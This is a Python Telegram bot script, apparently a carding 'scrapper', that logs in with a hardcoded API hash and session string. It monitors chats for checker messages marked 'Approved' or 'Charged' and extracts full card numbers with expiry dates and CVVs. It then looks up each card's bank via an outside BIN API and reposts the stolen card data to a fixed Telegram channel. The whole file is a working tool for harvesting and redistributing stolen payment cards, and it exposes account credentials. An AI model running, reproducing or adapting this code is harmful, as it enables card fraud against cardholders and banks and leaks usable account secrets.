import pyrogram
from pyrogram import Client, filters
import re
import asyncio
import aiohttp

def correct_padding(session_string):
    return session_string + "=" * ((4 - len(session_string) % 4) % 4)

# Update the session_string here with the new session string and apply padding
app = pyrogram.Client(
    'mrdaxx_scrapper',
    api_id='27649783',
    api_hash='834fd6015b50b781e0f8a41876ca95c8',
    session_string=correct_padding("BQGl5vcAsxQa8yrfEjo0F0HKcVfWGWVO5FQI2NDsrHtAn0VUYwBbIGncc8n8qpIqNlLoxFMEB0ox3PInbQDp4FC55iRXeZJKQfduFLv6Jgwih8ExeWgUeRtQBW-X1niHcUiCLRW6UZnCAGFxX7RrmosP6reQXaQospdyIK2O_DU9x9cEzGrgBXHxE4O0f7SzRYYsrUaAwiVwsQX4l3X6KujT3dob2SYY1drFY_vclBDba_MeEUXVOV-W40w2LWEfR9ZEmf3ePoIq-VewHUCTaQsfVbhBvyV2F4dntbxqFKah5FQlo8kWqWftsy3kC761GTA747QKbIv5jho6I20K43KgnwkTQwAAAABpRCaiAA")
)

BIN_API_URL = 'https://astroboyapi.com/api/bin.php?bin={}'

def filter_cards(text):
    regex = r'\d{15,16}\D*\d{2}\D*\d{2,4}\D*\d{3,4}'
    matches = re.findall(regex, text)
    return matches

async def bin_lookup(bin_number):
    bin_info_url = BIN_API_URL.format(bin_number)
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        async with session.get(bin_info_url) as response:
            if response.status == 200:
                try:
                    bin_info = await response.json()
                    return bin_info
                except aiohttp.ContentTypeError:
                    return None
            else:
                return None

async def approved(client_instance, message):
    try:
        if re.search(r'(Approved!|Charged|authenticate_successful|𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱|APPROVED|New Cards Found By DaxxScrapper|ꕥ Extrap [☭]|み RIMURU SCRAPE by|Approved) ✅', message.text):
            filtered_card_info = filter_cards(message.text)
            if not filtered_card_info:
                return

            for card_info in filtered_card_info:
                bin_number = card_info[:6]
                bin_info = await bin_lookup(bin_number)
                if bin_info:
                    brand = bin_info.get("brand", "N/A")
                    card_type = bin_info.get("type", "N/A")
                    level = bin_info.get("level", "N/A")
                    bank = bin_info.get("bank", "N/A")
                    country = bin_info.get("country_name", "N/A")
                    country_flag = bin_info.get("country_flag", "")

                    formatted_message = (
                        "┏━━━━━━━⍟\n"
                        "┃**#APPROVED 𝟓$ ✅**\n"
                        "┗━━━━━━━━━━━⊛\n\n"
                        f"**𝖢𝖠𝖱𝖣** ➠ <code>{card_info}</code>\n\n"
                        f"**𝖲𝖳𝖠𝖳𝖴𝖲** ➠ <b>**APPROVED**! ✅</b>\n\n"
                        f"**𝖡𝖨𝖭** ➠ <b>{brand}, {card_type}, {level}</b>\n\n"
                        f"**𝖡𝖠𝖭𝖪** ➠ <b>{bank}</b>\n\n"
                        f"**𝖢𝖮𝖴𝖭𝖳𝖱𝖸** ➠ <b>{country}, {country_flag}</b>\n\n"
                        "**𝖢𝖱𝖤𝖠𝖳𝖮𝖱** ➠ <b>๏─𝙂𝘽𝙋─๏</b>"
                    )

                    await client_instance.send_message(chat_id='-1002222638488', text=formatted_message)
    except Exception as e:
        print(f"An error occurred: {e}")

@app.on_message(filters.text)
async def astro(client_instance, message):
    if message.text:
        await asyncio.create_task(approved(client_instance, message))

app.run()
